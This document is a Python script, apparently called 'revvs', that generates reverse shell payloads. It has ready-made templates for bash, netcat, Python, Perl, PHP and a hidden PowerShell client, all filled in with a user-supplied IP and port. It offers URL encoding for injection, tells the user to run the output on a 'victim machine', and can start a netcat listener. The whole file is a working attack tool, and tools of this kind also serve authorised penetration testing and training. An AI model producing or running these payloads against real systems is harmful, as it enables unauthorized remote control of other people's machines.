#!/usr/bin/env python3

import os
import urllib.parse
import subprocess

# ANSI colors
RED = '\033[91m'
GREEN = '\033[92m'
CYAN = '\033[96m'
YELLOW = '\033[93m'
END = '\033[0m'

# Reverse shell templates
SHELLS = {
    "bash": 'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
    "nc traditional": 'nc {ip} {port} -e /bin/bash',
    "nc mkfifo": 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port} > /tmp/f',
    "python": 'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])\'',
    "perl": 'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}}\'',
    "php": 'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
    "powershell": 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
}

def print_banner():
    print(f"{CYAN}revvs - Reverse Shell Generator\n{'='*40}{END}")

def list_shells():
    print(f"{YELLOW}Available Shell Types:{END}")
    for i, name in enumerate(SHELLS.keys(), start=1):
        print(f"{GREEN}[{i}] {name}{END}")
    print()

def get_shell_choice():
    while True:
        try:
            choice = int(input("Select shell type (number): "))
            if 1 <= choice <= len(SHELLS):
                return list(SHELLS.items())[choice - 1]
            else:
                print(f"{RED}Invalid choice. Try again.{END}")
        except ValueError:
            print(f"{RED}Please enter a number.{END}")

def get_target_info():
    ip = input("Enter IP address: ").strip()
    port = input("Enter port number: ").strip()
    return ip, port

def ask_url_encode():
    response = input("Would you like to URL encode the payload? [y/N]: ").strip().lower()
    return response == 'y'

def ask_start_listener():
    response = input("Would you like to start a Netcat listener now? [y/N]: ").strip().lower()
    return response == 'y'

def generate_shell(template, ip, port):
    return template.format(ip=ip, port=port)

def url_encode(payload):
    return urllib.parse.quote(payload)

def start_listener(port):
    print(f"{CYAN}Starting Netcat listener on port {port}...{END}")
    try:
        subprocess.run(["nc", "-lvnp", port])
    except KeyboardInterrupt:
        print(f"{RED}Listener stopped.{END}")
    except Exception as e:
        print(f"{RED}Error: {e}{END}")

def main():
    print_banner()
    list_shells()
    name, template = get_shell_choice()
    ip, port = get_target_info()
    shell = generate_shell(template, ip, port)

    if ask_url_encode():
        shell = url_encode(shell)
        log_label = f"{name} reverse shell (URL Encoded)"
    else:
        log_label = f"{name} reverse shell"

    print(f"\n{CYAN}Generated {log_label}:{END}\n")
    print(f"{GREEN}{shell}{END}\n")

    print(f"{YELLOW}Tip:{END} Run this on your victim machine.")
    print(f"{YELLOW}If URL encoded, decode before using.{END}")
    print(f"{CYAN}On your attacker machine, run:{END}")
    print(f"{CYAN}nc -lvnp {port}{END}")

    if ask_start_listener():
        start_listener(port)

if __name__ == "__main__":
    main()
